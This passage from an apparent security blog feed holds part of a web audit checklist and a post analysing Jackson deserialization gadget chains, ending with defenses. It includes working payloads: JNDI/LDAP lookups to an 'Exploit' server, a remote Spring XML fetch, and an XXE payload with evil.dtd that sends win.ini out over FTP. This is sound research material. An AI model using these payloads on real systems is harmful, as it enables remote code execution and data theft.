密码安全</h3><ul><li>认证过程中传输的密码是否进行了加密处理</li></ul><p>可以采用哈希算法或者RSA等加密算法将密码加密后传递，或者是使用SSL来做传输层加密。</p><ul><li>修改密码功能是否进行了旧密码的验证或者是安全问题的确认</li><li>找回密码功能是否借用第三方途径</li></ul><p>第三方途径主要有电子邮件、手机短信等。这些途径应该是找回密码前预留的。</p><ul><li>找回密码功能是否采用验证码确认并重设机制</li></ul><p>部分应用的找回密码功能是直接将原密码发送到密码保护邮箱，这种方式存在一定的安全风险。</p><ul><li>检查密码设置页面是否对密码复杂度进行检查</li></ul><p>至少包含数字和字母，长度最少6位，避免用户输入弱口令</p><h2 id="七、调试-amp-接口"><a href="#七、调试-amp-接口" class="headerlink" title="七、调试&amp;接口"></a>七、调试&amp;接口</h2><h3 id="7-1-异常处理"><a href="#7-1-异常处理" class="headerlink" title="7.1 异常处理"></a>7.1 异常处理</h3><ul><li>是否捕获了应用出现的错误并阻止其输出给客户端</li></ul><p>详细的错误输出可能会导致SQL查询泄露、程序源代码泄露、物理路径泄露等。</p><ul><li>异常处理是否能够全面覆盖所有异常行为</li><li>异常处理是否会导致程序流程异常，引发安全问题</li></ul><p>备注：某些异常可能是致命的，但是如果程序捕获了异常，可能会导致程序绕过一些重要的步骤而直接执行后续的操作。</p><h3 id="7-2-数据接口"><a href="#7-2-数据接口" class="headerlink" title="7.2 数据接口"></a>7.2 数据接口</h3><ul><li>接口服务是否存在安全漏洞</li><li>接口服务后台登录是否存在弱密码</li></ul><p>例如：axis2，<a href="http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\axis2\WEB-INF\conf\axis2.xml里配置" target="_blank" rel="noopener">http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\axis2\WEB-INF\conf\axis2.xml里配置</a></p><ul><li>接口服务是否有默认的测试页面</li></ul><p>例如：axis2，<a href="http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径" target="_blank" rel="noopener">http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径</a></p><ul><li>接口服务应用是否包含身份认证，认证的帐号、密码（或密钥）的存储安全</li></ul><p>例如：使用WSS4J对SOAP报文体进行身份认证</p><ul><li>接口服务应用传输是否加密</li></ul><p>例如：使用WSS4J对SOAP报文体进行加密</p><ul><li>接口服务应用异常处理</li></ul><p>例如：Webservice应用对特殊字符的处理，是否会在报错信息中泄露数据，参考<a href="http://www.soapui.org/About-SoapUI/features.html#security-testing" target="_blank" rel="noopener">http://www.soapui.org/About-SoapUI/features.html#security-testing</a></p><h3 id="7-3-硬编码"><a href="#7-3-硬编码" class="headerlink" title="7.3 硬编码"></a>7.3 硬编码</h3><ul><li>代码中是否存在内置的敏感信息</li></ul><p>如：调试帐号、外部接口帐号/密码、数据加/解密密钥等</p><h2 id="八、日志审计"><a href="#八、日志审计" class="headerlink" title="八、日志审计"></a>八、日志审计</h2><h3 id="8-1-日志记录"><a href="#8-1-日志记录" class="headerlink" title="8.1 日志记录"></a>8.1 日志记录</h3><ul><li>应用是否会将用户密码记入日志</li><li>日志记录的内容是否合理，避免日志文件增长过快，造成磁盘空间不足</li></ul><h2 id="九、运行环境"><a href="#九、运行环境" class="headerlink" title="九、运行环境"></a>九、运行环境</h2><h3 id="9-1-应用配置"><a href="#9-1-应用配置" class="headerlink" title="9.1 应用配置"></a>9.1 应用配置</h3><ul><li>是否删除了不必要的网页、帐号及权限</li></ul><p>页面包括应用服务器的默认页面、管理后台、测试页面、备份文件等；帐号指Web应用服务器的运行帐户</p><ul><li>目录浏览是否被禁用</li><li>Web容器默认帐户的密码是否更改或禁用</li><li>不能删除的管理后台是否启用了密码保护</li><li>正式发布的应用是否包含开发调试文件、代码</li></ul><p>如SVN版本信息文件、调试工具/页面、功能模块中的调试接口等</p><ul><li>重要的配置信息是否进行了加密</li></ul><p>如数据库连接配置、其它接口连接配置等</p><h3 id="9-2-自定义错误"><a href="#9-2-自定义错误" class="headerlink" title="9.2 自定义错误"></a>9.2 自定义错误</h3><ul><li>是否自定义了403、404、500错误页面</li><li>错误页面是否会输出详细错误信息</li></ul><h3 id="9-3-日志管理"><a href="#9-3-日志管理" class="headerlink" title="9.3 日志管理"></a>9.3 日志管理</h3><ul><li>服务器是否开启了用户访问日志的记录</li><li>记录的日志是否满足问题回溯的要求</li></ul><p>是否记录了客户端地址、请求的方法、请求的URL、提交的参数（GET、POST、COOKIE参数）、请求的状态等</p><h2 id="十、第三方组件"><a href="#十、第三方组件" class="headerlink" title="十、第三方组件"></a>十、第三方组件</h2><p>分析应用使用的框架及引用的第三方组件，分析其是否存在各种已知漏洞，且当前环境漏洞是否可以重现</p><h3 id="10-1-框架"><a href="#10-1-框架" class="headerlink" title="10.1 框架"></a>10.1 框架</h3><ul><li>Struts/Struts 2</li><li>Turbine</li><li>Spring MVC</li><li>Hibernate</li><li>iBatis</li><li>DotNetNuke</li></ul><h3 id="10-2-编辑器"><a href="#10-2-编辑器" class="headerlink" title="10.2 编辑器"></a>10.2 编辑器</h3><ul><li>CKEditor/FCKEditor</li><li>eWebeditor</li><li>NicEdit</li><li>Free Rich Text Editor</li></ul><h3 id="10-3-上传组件"><a href="#10-3-上传组件" class="headerlink" title="10.3 上传组件"></a>10.3 上传组件</h3><ul><li>SmartUpload</li></ul><h3 id="10-4-安全功能"><a href="#10-4-安全功能" class="headerlink" title="10.4 安全功能"></a>10.4 安全功能</h3><h2 id="十一、安全功能"><a href="#十一、安全功能" class="headerlink" title="十一、安全功能"></a>十一、安全功能</h2><p>对于比较重要的业务系统，例如：支付系统，可以参考以下条目，进行检测</p><h3 id="11-1-登录认证"><a href="#11-1-登录认证" class="headerlink" title="11.1 登录认证"></a>11.1 登录认证</h3><ul><li>重要系统是否使用了双因素登录认证，例如：数字证书，支付盾，密保卡等，防止用户密码泄露导致系统被非法登录</li><li>重要系统是否使用了安全控件，对用户提交的关键数据进行加密</li><li>重要系统的后台管理界面是否限制了访问源地址</li><li>系统的密码重置等短信发送等功能的使用频率是否进行了限制，例如：一个手机号一分钟只能发送一条短信，防止被恶意利用多次发送短信</li><li>用户登录时的用户名，状态，源地址等关键信息需要记录到应用日志中，管理员可以进行查询</li><li>如果用户在不常用的地址登录，系统会提示用户，并显示上一次登录的源地址</li><li>对于多次密码错误的登录尝试，系统能否检测，禁止源地址访问10分钟，管理员登录后可以看到，也可以进行查询</li></ul><h3 id="11-2-数据操作"><a href="#11-2-数据操作" class="headerlink" title="11.2 数据操作"></a>11.2 数据操作</h3><ul><li>系统中大数据量查询等影响系统负载的功能是否进行了查询范围限制，例如：只能查询最近3个月的数据</li><li>系统中大数据量查询等影响系统负载的功能是否进行了查询频率限制，例如：一分钟内只能查询一次</li><li>高可用性要求的系统中是否有用户请求频率检测，超过访问阈值时，需要用户输入页面上的图形验证码，才能进一步操作</li><li>对报表查询等涉及大量数据的读取和导出操作，是否严格限制了查询范围，必要时可以使用双用户认证，限制单个用户大量读取业务数据的能力</li><li>业务关键数据的读取页面，是否使用静态密码、手机动态密码等二次验证，防止敏感数据泄露，例如：交易详单的查询</li><li>业务处理过程中用户身份等关键识别信息，是否保存在服务端，禁止从客户端提交</li><li>业务处理过程中关键操作需要用户确认和图形验证码，手机动态验证码等保护，防止重放攻击，例如：转账操作等</li><li>关键业务操作需要记录到应用日志中，可以设置阈值，超过系统会告警，管理员可以进行查询。例如：转账金额大于20万的交易记录</li><li>涉及资金的业务用户可以设置上限，例如：用户可以设置每日最高消费限额，并在转账</li><li>关键业务操作可以设置短信提醒，例如：用户进行资金转账，进行详单查询等</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列七——其他Gadgets与检测防御</title>
    <link href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E4%B8%83%E2%80%94%E2%80%94%E5%85%B6%E4%BB%96Gadgets/"/>
    <id>https://www.mi1k7ea.com/2019/11/24/Jackson系列七——其他Gadgets/</id>
    <published>2019-11-24T10:17:15.000Z</published>
    <updated>2019-11-26T15:46:48.274Z</updated>
    
    <content type="html"><![CDATA[<p>反序列化漏洞的利用链实在是太多了，前面都是挑了一些特别点的利用链进行了复现和调试分析，具体还有哪些以及所适用的版本看下Jackson的黑名单的设置就知道了。</p><h2 id="0x01-基于FileSystemXmlApplicationContext的利用链"><a href="#0x01-基于FileSystemXmlApplicationContext的利用链" class="headerlink" title="0x01 基于FileSystemXmlApplicationContext的利用链"></a>0x01 基于FileSystemXmlApplicationContext的利用链</h2><h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><p>和之前分析的ClassPathXmlApplicationContext类出自同一个包，一模一样的环境，只需要换下利用类为org.springframework.context.support.FileSystemXmlApplicationContext即可成功触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://127.0.0.1/spel.xml\"]"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/1.png" alt=""></p><p>FileSystemXmlApplicationContext类的漏洞原理和ClassPathXmlApplicationContext类是一样的，同样是没有setter方法，只有构造函数，而该函数中的refresh()函数存在SpEL注入漏洞。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>和前面<a href="https://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">CVE-2017-17485</a>的一样，只不过换了个同一个包下的不同类而已，具体的参考之前的调试分析即可。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">evaluate:163, StandardBeanExpressionResolver (org.springframework.context.expression)</span><br><span class="line">evaluateBeanDefinitionString:1452, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doResolveBeanClass:1409, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">resolveBeanClass:1372, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">determineTargetType:670, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">predictBeanType:637, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">isFactoryBean:1489, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doGetBeanNamesForType:421, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">getBeanNamesForType:391, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">registerBeanPostProcessors:189, PostProcessorRegistrationDelegate (org.springframework.context.support)</span><br><span class="line">registerBeanPostProcessors:709, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:534, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:142, FileSystemXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:85, FileSystemXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x02-基于JdbcRowSetImpl的利用链"><a href="#0x02-基于JdbcRowSetImpl的利用链" class="headerlink" title="0x02 基于JdbcRowSetImpl的利用链"></a>0x02 基于JdbcRowSetImpl的利用链</h2><h3 id="复现利用-1"><a href="#复现利用-1" class="headerlink" title="复现利用"></a>复现利用</h3><p>和Fastjson反序列化漏洞中的利用是一样的原理，都是利用JNDI注入漏洞实现反序列化漏洞的利用，不再多说，需要实现RMI服务或LDAP服务，注意JDK版本限制等：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"com.sun.rowset.JdbcRowSetImpl\", &#123;\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;]"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/2.png" alt=""></p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>参考<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1">Fastjson反序列化漏洞</a>对应的调试分析即可。</p><p>利用链：setDataSourceName()-&gt;..-&gt;setAutoCommit()-&gt;connect()-&gt;IntialContext.lookup()</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x03-基于C3P0-JndiRefForwardingDataSource的利用链"><a href="#0x03-基于C3P0-JndiRefForwardingDataSource的利用链" class="headerlink" title="0x03 基于C3P0 JndiRefForwardingDataSource的利用链"></a>0x03 基于C3P0 JndiRefForwardingDataSource的利用链</h2><h3 id="复现利用-2"><a href="#复现利用-2" class="headerlink" title="复现利用"></a>复现利用</h3><p>需要开启RMI服务或LDAP服务，另外还需要c3p0-0.9.5.2，mchange-commons-java-0.2.15等jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\", &#123;\"jndiName\":\"ldap://localhost:1389/Exploit\", \"loginTimeout\":0&#125;]"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/3.png" alt=""></p><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>看到PoC中设置了两个属性值jndiName和loginTimeout。</p><p>我们调试的时候直接往com.mchange.v2.c3p0.JndiRefForwardingDataSource类的setLoginTimeout()及其父类JndiRefDataSourceBase.setJndiName()上打上断点。</p><p>前面的解析和反序列化过程跟之前的调试分析是一样的，调用deserializeAndSet()函数，再在其中调用<code>_setter.invoke()</code>实现反射调用目标类属性的setter方法。这里是先调用JndiRefDataSourceBase.setJndiName()设置jndiName属性值为我们的恶意LDAP服务地址：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/4.png" alt=""></p><p>往下调试，接着调用JndiRefForwardingDataSource.setLoginTimeout()函数设置loginTimeout属性值，可以看到先调用了inner()方法：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/5.png" alt=""></p><p>跟进inner()方法，由于inner并未有缓存即cachedInner为空，所以会往下执行调用dereference()函数：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/6.png" alt=""></p><p>在dereference()函数中，就是典型的JNDI注入漏洞了，其中lookup()函数的参数就是前面调用setJndiName()设置的属性值：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/7.png" alt=""></p><p>往下就是JNDI注入的过程了。</p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:2, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)</span><br><span class="line">inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)</span><br><span class="line">setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x04-基于XPathParser的利用链"><a href="#0x04-基于XPathParser的利用链" class="headerlink" title="0x04 基于XPathParser的利用链"></a>0x04 基于XPathParser的利用链</h2><h3 id="复现利用-3"><a href="#复现利用-3" class="headerlink" title="复现利用"></a>复现利用</h3><p>需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><p>和<a href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%94CVE-2019-12814%EF%BC%88%E5%9F%BA%E4%BA%8EJDOM-XSLTransformer%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">《Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）》</a>类似，只不过注入的XXE payload直接写在JSON数组中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"org.apache.ibatis.parsing.XPathParser\", \"&lt;!DOCTYPE ANY[\\n&lt;!ENTITY % file SYSTEM 'file:///c:/windows/win.ini'&gt;\\n&lt;!ENTITY % remote SYSTEM 'http://127.0.0.1/xxe/evil.dtd'&gt;\\n%remote;\\n%send;\\n]&gt;\"]"</span>;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all;</span><br></pre></td></tr></table></figure><p>开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/8.png" alt=""></p><h3 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h3><p>在调用newInstance()函数的时候，会新建一个XPathParser类对象，同时会调用该类的构造函数：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/9.png" alt=""></p><p>其中会调用createDocument()函数，其中直接调用DocumentBuilder.parse()而未调用setFeature()设置禁用的解析类型，并且参数是我们外部可控的XML内容，因此妥妥的XXE：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/10.png" alt=""></p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">parse:339, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">createDocument:257, XPathParser (org.apache.ibatis.parsing)</span><br><span class="line">&lt;init&gt;:55, XPathParser (org.apache.ibatis.parsing)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x05-更多的一些Gadgets"><a href="#0x05-更多的一些Gadgets" class="headerlink" title="0x05 更多的一些Gadgets"></a>0x05 更多的一些Gadgets</h2><p>收集的一些利用链payload，具体环境和原理可自行搭建调试分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[&quot;org.springframework.context.support.GenericGroovyApplicationContext&quot;, &quot;http://127.0.0.1:8000/spel.xml&quot;]</span><br><span class="line">         </span><br><span class="line">[&quot;org.apache.openjpa.ee.RegistryManagedRuntime&quot;, &#123;&quot;registryName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;rollbackOnly&quot;: null&#125;]</span><br><span class="line"></span><br><span class="line">[&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;, &#123;&quot;transactionManagerName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;rollbackOnly&quot;: null&#125;]</span><br><span class="line"></span><br><span class="line">[&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;, &quot;jms:/ldap://localhost:1389/Exploit&quot;]</span><br><span class="line"></span><br><span class="line">[&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;, &#123;&quot;properties&quot;:&#123;&quot;jndiname&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;, &#123;&quot;jndiname&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;]</span><br></pre></td></tr></table></figure><h2 id="0x06-检测与防御"><a href="#0x06-检测与防御" class="headerlink" title="0x06 检测与防御"></a>0x06 检测与防御</h2><h3 id="检查方法"><a href="#检查方法" class="headerlink" title="检查方法"></a>检查方法</h3><p>检查是否使用到了Jackson，并且版本号是否是漏洞版本，若是则排查是否存在<code>ObjectMapper.readValue</code>，同时排查是否开启了DefaultTyping或使用了设置有问题的@JsonTypeInfo注解。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>升级到最新版的Jackson；</li><li>禁用enableDefaultTyping()；</li><li>禁用@JsonTypeInfo注解，或严格限制只能使用值为JsonTypeInfo.Id.NONE或JsonTypeInfo.Id.NAME的注解；</li><li>避免使用Object作为Jackson反序列化的类型；</li></ul>]]></content>
